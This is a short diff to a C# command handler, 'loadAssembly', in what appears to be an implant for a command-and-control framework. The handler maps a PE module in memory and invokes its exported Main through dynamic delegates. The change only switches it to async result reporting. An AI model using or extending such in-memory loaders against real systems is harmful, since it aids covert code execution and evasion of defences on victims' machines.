@@ -8,6 +8,7 @@ using System.Threading.Tasks;
 using Engineer.Extra;
 using System.IO;
 using static Engineer.Extra.WinApiDynamicDelegate;
+using Engineer.Functions;
 
 namespace Engineer.Commands
 {
@@ -15,7 +16,7 @@ namespace Engineer.Commands
     {
         public override string Name => "loadAssembly";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             try
             {
@@ -31,13 +32,14 @@ namespace Engineer.Commands
 
                 IntPtr address =  reprobate.GetExportAddress(mappedModule.ModuleBase, "Main");
 
-                return  (string)reprobate.DynamicFunctionInvoke(address, typeof(GenericDelegate),ref parameters);
+                string output = ((string)reprobate.DynamicFunctionInvoke(address, typeof(GenericDelegate),ref parameters));
+                Tasking.FillTaskResults(output, task, EngTaskStatus.Complete);
                 // reprobate.CallMappedPEModule(mappedModule.PEINFO, mappedModule.ModuleBase);
 
             }
             catch(Exception ex)
             {
-                return "error: " +ex.Message;
+                Tasking.FillTaskResults("error: " +ex.Message,task,EngTaskStatus.Failed);
                 
             }
         }
